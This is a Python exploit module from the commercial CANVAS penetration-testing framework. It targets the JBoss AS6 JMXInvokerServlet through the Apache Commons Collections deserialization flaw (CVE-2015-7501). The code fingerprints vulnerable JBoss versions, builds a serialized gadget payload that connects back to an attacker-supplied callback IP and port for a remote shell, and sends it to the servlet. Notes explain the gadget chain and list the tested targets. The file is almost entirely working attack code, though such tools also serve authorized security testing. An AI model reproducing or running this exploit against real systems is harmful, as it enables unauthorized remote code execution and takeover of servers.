#!/usr/bin/env python

# Proprietary CANVAS source code - use only under the license agreement
# specified in LICENSE.txt in your CANVAS distribution
# Copyright Immunity, Inc, 2002-2006
# http://www.immunityinc.com/CANVAS/ for more information

import sys
import logging
import os
import base64
import struct
import re

from urllib import quote
from time import sleep

if "." not in sys.path:
    sys.path.append(".")

import canvasengine
import urllib
import random
import libs.spkproxy as spkproxy
from libs.apache_commons_deserialize import objectcreator

from exploitutils import *
from tcpexploit import *
from canvasexploit import *

NAME                            = "jboss6_jmxinvokerservlet_deserialize"
DESCRIPTION                     = "JBoss AS6 JMXInvokerServlet Apache Commons pre-3.2.2 Deserialization Code Execution"
DOCUMENTATION                   = {}
DOCUMENTATION['VENDOR']         = "Red Hat"
DOCUMENTATION['Repeatability']  = "Infinite"
DOCUMENTATION['CVE Name']       = "CVE-2015-7501"
DOCUMENTATION['CVE Url']        = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-7501"
DOCUMENTATION['References']     = ['http://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/',
                                   "https://access.redhat.com/security/cve/CVE-2015-7501",
                                   'https://access.redhat.com/solutions/2045023']

VERSION                         = "1.0"

PROPERTY                        = {}
PROPERTY['TYPE']                = "Web Exploits"
PROPERTY['SITE']                = "Remote"
PROPERTY['ARCH']                = [["Linux" ]]

DOCUMENTATION['NOTES'] = """
IMPORTANT NOTE: Any instance of this application running Apache Commons Collections version prior to 3.0 WILL NOT WORK. 


JBoss AS6 has a remote monitoring servlet named JMXInvokerServlet. It communicates
with a client by exchanging serialized Java Objects. Apache Commons pre-3.2 allows users to serialize
transformers on collection values. Of importance to us is the InvokerTransfomer, which is capable 
of invoking Java methods. We are able to run these transformers by adding them to an
annotation map whose members are acccessed. The right chain of method invocations leads to arbitrary
code execution.

NOTE: By default, JBoss6 starts the console/management interface on localhost:8080.
For this module to work, the console/management interface needs to be accessible from
the host that runs CANVAS.

Version support:
> Ubuntu Linux 14.04.3 - x86
- 6.0.0 on Java SE 6 / 7 / 8
- 4.2.0 on Java SE 6 / 7 / 8
- 4.2.1 on Java SE 7
- 4.2.3 on Java SE 7
> Windows 7 Ultimate SP 1 x86
- 6.0.0 on Java SE 6 / 7
- 6.0.0 on Java SE 8 FAILED
- 4.2.0 on Java SE 6 / 7
- 4.2.0 on Java SE 8 FAILED
- 4.2.1 on Java SE 6 / 7
- 4.2.1 on Java SE 8 FAILED
- 4.2.3 on Java SE 6 / 7
- 4.2.3 on Java SE 8 FAILED

"""

CHANGELOG = """
"""


class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.port               = 8080
        self.host               = ""
        self.version            = 0
        self.done               = 0
        self.ssl                = ""
        self.name               = NAME
        self.basepath           = "/invoker/JMXInvokerServlet"
        self.remote_mosdef_path = "/tmp/%s" % str(random.randint(0, 3000))

        self.mosdef_type = "UNIVERSAL"
        self.http_ssl = False
        
        # self.command            = None
        self.basicauth_user     = ""
        self.basicauth_password = ""
        self.hostname           = None
        self.verb               = "POST"
        self.content_type       = ""
        self.top_version_re     = re.compile("JBoss(?P<top_version>[^\s]+)")
        self.version_re         = re.compile("(?P<version>[\.\d]+)")


        self.targetpath         = ""


        # MOSDEF options
        self.autoFind = False
        

        return
    
    def neededListenerTypes(self):
        mosdef_type = self.argsDict.get("mosdef_type_value", self.mosdef_type).upper().strip()
        
        if mosdef_type == "HTTP":
            if self.http_ssl:
                return [canvasengine.HTTPMOSDEF_SSL]
            else:
                return [canvasengine.HTTPMOSDEF]
        else:
            return [canvasengine.UNIVERSAL_MOSDEF]

    def needs_mosdef_http(self):
        mosdef_type = self.argsDict.get("mosdef_type_value", self.mosdef_type).upper().strip()

        return mosdef_type == "HTTP"

    def needs_mosdef_ssl(self):
        return self.http_ssl

    def getargs(self):
        """
        Get arguments for attack
        """
        self.mosdef_type        = self.argsDict.get("mosdef_type_value", self.mosdef_type).upper().strip()
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        self.basepath=self.argsDict.get("basepath",self.basepath)
        self.command=self.argsDict.get("command",self.command)
        self.ssl=self.argsDict.get("ssl",self.ssl)
        return

    def send_jboss_request(self, payload=None):
        if not self.hostname:
            self.hostname = self.host
            
        self.log("Attacking %s:%d" % (self.hostname, self.port))
        self.log("Basic Auth User: %s" % self.basicauth_user)
        self.log("VHost: %s" % self.hostname)
        
        #setup our UA first
        if self.ssl:
            protocol = "https"
        else:
            protocol = "http"

        #If we have to do basic-auth, let's get an object from spkproxy here
        if self.basicauth_user:
            auth = spkproxy.BasicAuth(self.basicauth_user, self.basicauth_password)
        else:
            auth = None
        
        targetstring = protocol + "://" + self.hostname + ":" + str(self.port) + self.basepath
        self.ua = spkproxy.UserAgent(targetstring, auth=auth, hostname=self.hostname, exploit=self)

        host_field = "%s:%s" % (self.hostname, self.port)
        
        self.ua.addHeader("Host", host_field)
 
        data = None
        if payload != None:
            data = self.ua.POST(self.targetpath, payload, extraheaders=None, noresponse=True)
        else:
            data = self.ua.GET(self.targetpath, noresponse=False)

        return data
        
    def extract_regex_result(self, string, regex, field_name):
        result = regex.search(string)
        
        if not result:
            return None
        else:
            result_dict = result.groupdict()
            if field_name not in result_dict:
                return None
            else:
                return result_dict[field_name]
    
    def getsocket(self):
        if ":" in self.host:
            return self.gettcpsock(AF_INET6=1)
        else:
            return self.gettcpsock()

            
    def test(self):
        self.getargs()
        if not self.hostname:
            self.hostname = self.host

        sock = self.getsocket()
        sock.set_timeout(5)
        sock.connect((self.hostname, self.port))

        sock.sendall("GET /invoker/JMXInvokerServlet HTTP/1.0\n\n")
        response = sock.recv(1024)
        sock.close()

        version = None


        for header_entry in response.split("\r\n"):
            if "X-Powered-By:" in header_entry:
                top_version = self.extract_regex_result(header_entry,
                                                        self.top_version_re,
                                                        "top_version")
                
                version_search = re.search(self.version_re,
                                           top_version)


                if version_search != None:
                    result = version_search.groupdict()
                    version = result["version"]
                    break
                    
        version_supported = ((version <= "6") and (version >= "4.2.1")) if version != None else False
        
        return version_supported
                
    def run(self):
        self.getargs()

        self.setInfo("%s attacking %s:%d (in progress)" % (self.name, self.host, self.port))

        if self.test():
            self.setProgress(50)


            payload = objectcreator(callback_ip=self.callback.ip,
                                    callback_port=self.callback.port,
                                    use_http=self.needs_mosdef_http(),
                                    use_ssl=self.needs_mosdef_ssl()).get_payload()
            
            self.send_jboss_request(payload)
            
            self.setProgress(100)
            
            self.setInfo("%s attacking %s:%d (DONE)" % (self.name, self.host, self.port))
            

        return 1


    def usage(self):
        logging.info("Example: " + sys.argv[0] + " -t 172.16.100.142 -l 172.16.100.1 -d 5555")
        logging.info("-t <target ip>")
        logging.info("-p <target port>                 [optional]")
        logging.info("-O basepath: /path/to/vbulletin/ [optional]")
        logging.info("-O hostname: target vhost        [optional]")
        logging.info("-l call back ip for standard callback")
        logging.info("-d listening port for callback")
        return


if __name__ == '__main__':
    logging.info("Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION))
    app = theexploit()
    ret = standard_callback_commandline(app)
